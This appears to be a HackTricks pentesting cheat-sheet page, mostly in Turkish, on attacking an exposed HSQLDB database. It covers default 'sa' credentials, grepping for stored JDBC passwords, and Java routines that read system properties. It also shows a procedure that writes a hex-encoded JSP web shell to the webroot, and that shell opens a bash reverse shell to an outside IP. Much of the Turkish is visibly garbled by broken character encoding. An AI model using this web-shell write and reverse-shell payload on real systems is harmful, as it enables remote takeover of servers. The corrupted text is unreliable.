{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}


# Temel Bilgiler

**HSQLDB \([HyperSQL DataBase](http://hsqldb.org/)\)**, Java ile yazÄ±lmÄ±ÅŸ Ã¶nde gelen SQL iliÅŸkisel veritabanÄ± sistemidir. Bellek iÃ§i ve disk tabanlÄ± tablolarla kÃ¼Ã§Ã¼k, hÄ±zlÄ± Ã§ok iÅŸ parÃ§acÄ±klÄ± ve iÅŸlemeli bir veritabanÄ± motoru sunar ve gÃ¶mÃ¼lÃ¼ ve sunucu modlarÄ±nÄ± destekler.

**VarsayÄ±lan port:** 9001
```text
9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
```
# Bilgi

### VarsayÄ±lan Ayarlar

Bu hizmetin varsayÄ±lan olarak muhtemelen bellekte Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± veya localhost'a baÄŸlÄ± olduÄŸunu unutmayÄ±n. EÄŸer bunu bulduysanÄ±z, muhtemelen baÅŸka bir hizmeti istismar ettiniz ve yetkileri artÄ±rmaya Ã§alÄ±ÅŸÄ±yorsunuzdur.

VarsayÄ±lan kimlik bilgileri genellikle boÅŸ bir ÅŸifre ile `sa`dÄ±r.

BaÅŸka bir hizmeti istismar ettiyseniz, olasÄ± kimlik bilgilerini aramak iÃ§in
```text
grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
```
Not: VeritabanÄ± adÄ±nÄ± dikkatlice not edin - baÄŸlanmak iÃ§in buna ihtiyacÄ±nÄ±z olacak.

# Bilgi Toplama

DB Ã¶rneÄŸine baÄŸlanmak iÃ§in [HSQLDB'yi indirin](https://sourceforge.net/projects/hsqldb/files/) ve `hsqldb/lib/hsqldb.jar` dosyasÄ±nÄ± Ã§Ä±karÄ±n. GUI uygulamasÄ±nÄ± \(eww\) `java -jar hsqldb.jar` komutuyla Ã§alÄ±ÅŸtÄ±rÄ±n ve keÅŸfedilen/zayÄ±f kimlik bilgilerini kullanarak Ã¶rneÄŸe baÄŸlanÄ±n.

BaÄŸlantÄ± URL'sinin uzaktan bir sistem iÃ§in ÅŸÃ¶yle gÃ¶rÃ¼neceÄŸini unutmayÄ±n: `jdbc:hsqldb:hsql://ip/DBNAME`.

# Hileler

## Java Dili Rutinleri

HSQLDB'den Java sÄ±nÄ±fÄ±nÄ±n statik yÃ¶ntemlerini Ã§aÄŸÄ±rabiliriz. Ã‡aÄŸrÄ±lan sÄ±nÄ±fÄ±n uygulamanÄ±n classpath'inde olmasÄ± gerektiÄŸini unutmayÄ±n.

JRT'ler `fonksiyonlar` veya `prosedÃ¼rler` olabilir. Fonksiyonlar, Java yÃ¶ntemi bir veya daha fazla SQL uyumlu ilkel deÄŸiÅŸken dÃ¶ndÃ¼rÃ¼yorsa SQL ifadeleri aracÄ±lÄ±ÄŸÄ±yla Ã§aÄŸrÄ±labilir. `VALUES` ifadesi kullanÄ±larak Ã§aÄŸrÄ±lÄ±rlar.

Ã‡aÄŸÄ±rmak istediÄŸimiz Java yÃ¶ntemi void dÃ¶ndÃ¼rÃ¼yorsa, `CALL` ifadesi ile Ã§aÄŸrÄ±lan bir prosedÃ¼r kullanmamÄ±z gerekir.

## Java Sistem Ã–zelliklerini Okuma

Fonksiyon oluÅŸtur:
```text
CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```
Fonksiyonu Ã§alÄ±ÅŸtÄ±r:
```text
VALUES(getsystemproperty('user.name'))
```
You can find a [list of system properties here](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html).

## Write Content to File

`com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` Java aracÄ±, Ã¶zel bir prosedÃ¼r aracÄ±lÄ±ÄŸÄ±yla disk'e hex kodlu Ã¶ÄŸeler yazmak iÃ§in kullanÄ±labilir \(uygulamanÄ±n sÄ±nÄ±f yoluna otomatik olarak yÃ¼klendi\). **Maksimum boyutun 1024 bayt olduÄŸunu unutmayÄ±n**.

ProsedÃ¼r oluÅŸturun:
```text
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```
ProsedÃ¼rÃ¼ Ã§alÄ±ÅŸtÄ±r:
```text
call writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]' AS VARBINARY(1024)))
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
